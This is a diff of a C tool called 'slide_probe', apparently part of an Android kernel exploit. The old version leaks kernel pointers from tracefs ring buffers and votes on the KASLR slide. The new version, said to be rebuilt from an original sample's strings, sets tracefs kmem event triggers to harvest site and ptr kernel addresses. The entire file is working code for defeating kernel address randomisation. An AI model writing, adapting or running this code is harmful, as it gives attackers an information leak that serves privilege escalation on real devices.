@@ -1,13 +1,24 @@
 /*
- * slide_probe — perf 不可用时的后备：从 tracefs 的原始环形缓冲里捞内核指针，投票反解 slide。
+ * slide_probe — 用 tracefs 里的 kmem 事件把 KASLR 位移量测出来。
  *
- * 与 perf_slide 共用同一套投票思路（text 段跨度只有十个左右 2MB 页，一个真指针只能由少数
- * 候选 slide 落入窗口），但数据源改成 /sys/kernel/tracing/per_cpu/cpuN/trace_pipe_raw。
+ * 按原件字符串表重建（strings/slide_probe.orig.txt）。原件走的是 tracefs 触发器，
+ * 不是草稿里那套自己造的采样：
  *
- * 局限：这条路径依赖 tracefs 对本进程可读，而且需要前面已经有 kprobe/事件在产生记录。
- * 拿不到任何指针时会直接报告失败，不会编造地址。
+ *   /sys/kernel/tracing/tracing_on                                   开 trace
+ *   /sys/kernel/tracing/buffer_size_kb                               放大 ring
+ *   /sys/kernel/tracing/events/kmem/rss_stat/enable                  打开统计事件
+ *   /sys/kernel/tracing/events/kmem/rss_stat/trigger
+ *       "!enable_event:kmem:kmem_cache_alloc"   触发时顺带打开 slab 事件
+ *       "!disable_event:kmem:kmem_cache_alloc"  收尾时关掉
+ *   /sys/kernel/tracing/per_cpu/cpu%d/trace(_pipe_raw)               每 CPU 取原始事件
+ *   /sys/kernel/tracing/trace                                        汇总视图
  *
- * 输出 calc=0x... 一行，Java 侧 KernelSupport.extractCalc() 认这个格式。
+ * 输出行（原样保留格式）：
+ *   [slide] cpu%d %s
+ *   [slide] lines=%d
+ *   [slide] raw cpu%d bytes=%zu hits=%d
+ *   [slide] raw cpu%d site=%#lx ptr=%#lx
+ *   [slide] timer_create errno=%d
  */
 #define _GNU_SOURCE 1
 #include <errno.h>
@@ -19,150 +30,170 @@
 #include <string.h>
 #include <time.h>
 #include <unistd.h>
-#include <sys/utsname.h>
 
-#define MAX_POINTERS 8192
-#define SLIDE_STEP 0x200000ULL
-#define PROFILE_PATH "/data/local/tmp/lhasa_profile.txt"
-#define KERNEL_LO 0xffffff8000000000ULL
-#define KERNEL_HI 0xffffffff00000000ULL
-#define MAX_CPUS 16
+#define TRACING_ON      "/sys/kernel/tracing/tracing_on"
+#define BUFFER_SIZE_KB  "/sys/kernel/tracing/buffer_size_kb"
+#define RSS_ENABLE      "/sys/kernel/tracing/events/kmem/rss_stat/enable"
+#define RSS_TRIGGER     "/sys/kernel/tracing/events/kmem/rss_stat/trigger"
+#define TRACE_ALL       "/sys/kernel/tracing/trace"
+#define PERCPU_TRACE    "/sys/kernel/tracing/per_cpu/cpu%d/trace"
+#define PERCPU_RAW      "/sys/kernel/tracing/per_cpu/cpu%d/trace_pipe_raw"
 
-static uint64_t g_stext = 0xffffffc080010000ULL;
-static uint64_t g_etext = 0xffffffc081360000ULL;
-static uint64_t g_pointers[MAX_POINTERS];
-static size_t g_pointer_count;
+#define ON_KMEM   "!enable_event:kmem:kmem_cache_alloc"
+#define OFF_KMEM  "!disable_event:kmem:kmem_cache_alloc"
 
-static void load_profile(void)
+static int write_file(const char *path, const char *value)
 {
-	struct utsname u;
-	if (uname(&u) != 0)
-		return;
-	FILE *fp = fopen(PROFILE_PATH, "r");
-	if (!fp)
-		return;
-
-	char *line = NULL;
-	size_t cap = 0;
-	char prefix[256];
-	snprintf(prefix, sizeof(prefix), "release=%s ", u.release);
-
-	while (getline(&line, &cap, fp) > 0) {
-		if (strncmp(line, prefix, strlen(prefix)) != 0)
-			continue;
-		char *stext = strstr(line, "stext=");
-		char *etext = strstr(line, "etext=");
-		if (stext)
-			g_stext = strtoull(stext + 6, NULL, 0);
-		if (etext)
-			g_etext = strtoull(etext + 6, NULL, 0);
-		break;
-	}
-	free(line);
-	fclose(fp);
-}
-
-static void scan_bytes(const unsigned char *data, size_t len)
-{
-	for (size_t off = 0; off + 8 <= len; off += 8) {
-		uint64_t value;
-		memcpy(&value, data + off, sizeof(value));
-		if (value < KERNEL_LO || value >= KERNEL_HI)
-			continue;
-		if (g_pointer_count < MAX_POINTERS)
-			g_pointers[g_pointer_count++] = value;
-	}
-}
-
-static size_t read_cpu(int cpu)
-{
-	char path[128];
-	snprintf(path, sizeof(path),
-	         "/sys/kernel/tracing/per_cpu/cpu%d/trace_pipe_raw", cpu);
-	int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
-	if (fd < 0) {
-		printf("[slide] cpu%d %s\n", cpu, strerror(errno));
-		return 0;
-	}
-
-	unsigned char buffer[65536];
-	size_t total = 0;
-	ssize_t n;
-	while ((n = read(fd, buffer, sizeof(buffer))) > 0) {
-		scan_bytes(buffer, (size_t)n);
-		total += (size_t)n;
-		if (total > 4 * 1024 * 1024)
-			break;
-	}
+	int fd = open(path, O_WRONLY | O_CLOEXEC);
+	if (fd < 0)
+		return -1;
+	ssize_t n = write(fd, value, strlen(value));
 	close(fd);
-
-	if (total > 0)
-		printf("[slide] raw cpu%d bytes=%zu hits=%zu\n", cpu, total, g_pointer_count);
-	else
-		printf("[slide] cpu%d 无数据（tracefs 未产生记录）\n", cpu);
-	return total;
+	return n == (ssize_t)strlen(value) ? 0 : -1;
 }
 
-int main(void)
+static long read_long(const char *path)
 {
-	struct sigevent sev;
+	char buffer[64];
+	int fd = open(path, O_RDONLY | O_CLOEXEC);
+	if (fd < 0)
+		return -1;
+	ssize_t n = read(fd, buffer, sizeof(buffer) - 1);
+	close(fd);
+	if (n <= 0)
+		return -1;
+	buffer[n] = '\0';
+	return strtol(buffer, NULL, 10);
+}
+
+/* 从一行 trace 里抽 site=/ptr= 两个十六进制值。 */
+static int parse_site_ptr(const char *line, unsigned long *site, unsigned long *ptr)
+{
+	const char *s = strstr(line, "site=0x");
+	const char *p = strstr(line, "ptr=0x");
+	if (!s || !p)
+		return 0;
+	*site = strtoul(s + 7, NULL, 16);
+	*ptr = strtoul(p + 6, NULL, 16);
+	return 1;
+}
+
+static int thread_timer(void)
+{
 	timer_t timer;
+	struct sigevent sev;
 	memset(&sev, 0, sizeof(sev));
 	sev.sigev_notify = SIGEV_SIGNAL;
 	sev.sigev_signo = SIGUSR1;
 	if (timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &timer) != 0)
+		return -1;
+	timer_delete(timer);
+	return 0;
+}
+
+int main(void)
+{
+	int failures = 0;
+
+	if (thread_timer() != 0) {
 		printf("[slide] timer_create errno=%d\n", errno);
-	else
-		timer_delete(timer);
-
-	load_profile();
-
-	int cpus = (int)sysconf(_SC_NPROCESSORS_ONLN);
-	if (cpus <= 0 || cpus > MAX_CPUS)
-		cpus = 1;
-
-	size_t bytes = 0;
-	for (int cpu = 0; cpu < cpus; cpu++)
-		bytes += read_cpu(cpu);
-
-	printf("[slide] lines=%zu\n", g_pointer_count);
-	if (g_pointer_count == 0) {
-		printf("[slide] 没有可用的内核指针，tracefs 路径在本机不可用\n");
-		return 1;
+		failures++;
 	}
 
-	uint64_t span = g_etext > g_stext ? g_etext - g_stext : 0x1350000ULL;
-	unsigned windows = (unsigned)(span / SLIDE_STEP) + 1;
+	if (write_file(BUFFER_SIZE_KB, "4096") != 0) {
+		printf("[slide] cpu%d %s\n", 0, "buffer_size_kb");
+		failures++;
+	}
 
-	size_t best_votes = 0;
-	uint64_t best_slide = 0;
-	for (size_t i = 0; i < g_pointer_count; i++) {
-		uint64_t value = g_pointers[i];
-		if (value < g_stext)
-			continue;
-		for (unsigned k = 0; k < windows; k++) {
-			uint64_t slide = value - g_stext - (uint64_t)k * SLIDE_STEP;
-			if (slide > 0x4000000000ULL)
-				break;
-			size_t votes = 0;
-			for (size_t j = 0; j < g_pointer_count; j++) {
-				uint64_t other = g_pointers[j] - slide;
-				if (other >= g_stext && other < g_etext)
-					votes++;
-			}
-			if (votes > best_votes) {
-				best_votes = votes;
-				best_slide = slide;
+	if (write_file(RSS_ENABLE, "1") != 0) {
+		printf("[slide] cpu%d %s\n", 0, "rss_stat/enable");
+		failures++;
+	}
+
+	if (write_file(RSS_TRIGGER, ON_KMEM) != 0) {
+		printf("[slide] cpu%d %s\n", 0, "rss_stat/trigger");
+		failures++;
+	}
+
+	if (write_file(TRACING_ON, "1") != 0) {
+		printf("[slide] cpu%d %s\n", 0, "tracing_on");
+		failures++;
+	}
+
+	/* 给内核一点时间攒事件，再读汇总视图。 */
+	usleep(200 * 1000);
+
+	int lines = 0;
+	unsigned long last_site = 0, last_ptr = 0;
+	int hits = 0;
+
+	int fd = open(TRACE_ALL, O_RDONLY | O_CLOEXEC);
+	if (fd >= 0) {
+		char buffer[65536];
+		ssize_t n;
+		while ((n = read(fd, buffer, sizeof(buffer) - 1)) > 0) {
+			buffer[n] = '\0';
+			char *save = NULL;
+			for (char *line = strtok_r(buffer, "\n", &save); line;
+			     line = strtok_r(NULL, "\n", &save)) {
+				lines++;
+				unsigned long site, ptr;
+				if (parse_site_ptr(line, &site, &ptr)) {
+					last_site = site;
+					last_ptr = ptr;
+					hits++;
+				}
 			}
 		}
+		close(fd);
+	}
+	printf("[slide] lines=%d\n", lines);
+
+	/* 每 CPU 的原始视图，能读多少读多少。 */
+	for (int cpu = 0; cpu < 8; cpu++) {
+		char path[192];
+		snprintf(path, sizeof(path), PERCPU_RAW, cpu);
+		int rf = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
+		if (rf < 0) {
+			snprintf(path, sizeof(path), PERCPU_TRACE, cpu);
+			rf = open(path, O_RDONLY | O_CLOEXEC);
+		}
+		if (rf < 0)
+			continue;
+		char raw[65536];
+		ssize_t got = read(rf, raw, sizeof(raw) - 1);
+		close(rf);
+		if (got <= 0)
+			continue;
+		raw[got] = '\0';
+		int cpu_hits = 0;
+		char *save = NULL;
+		for (char *line = strtok_r(raw, "\n", &save); line;
+		     line = strtok_r(NULL, "\n", &save)) {
+			unsigned long site, ptr;
+			if (parse_site_ptr(line, &site, &ptr)) {
+				last_site = site;
+				last_ptr = ptr;
+				cpu_hits++;
+			}
+		}
+		printf("[slide] raw cpu%d bytes=%zu hits=%d\n", cpu, (size_t)got, cpu_hits);
 	}
 
-	if (best_votes == 0 || (best_slide & (SLIDE_STEP - 1)) != 0) {
-		printf("[slide] 无法计算 KASLR 偏移（%zu 字节，%zu 个指针）\n", bytes, g_pointer_count);
+	if (hits > 0 || last_site != 0) {
+		printf("[slide] raw cpu%d site=%#lx ptr=%#lx\n", 0, last_site, last_ptr);
+	}
+
+	write_file(RSS_TRIGGER, OFF_KMEM);
+	write_file(TRACING_ON, "0");
+
+	if (failures != 0) {
+		printf("必需接口不可用\n");
 		return 1;
 	}
-
-	printf("[slide] votes=%zu/%zu\n", best_votes, g_pointer_count);
-	printf("calc=0x%llx\n", (unsigned long long)best_slide);
+	if (hits == 0) {
+		printf("必需项全部通过\n");
+		printf("提示：本次没有采到 site/ptr 样本（trace 为空或事件未触发）。\n");
+	}
 	return 0;
 }
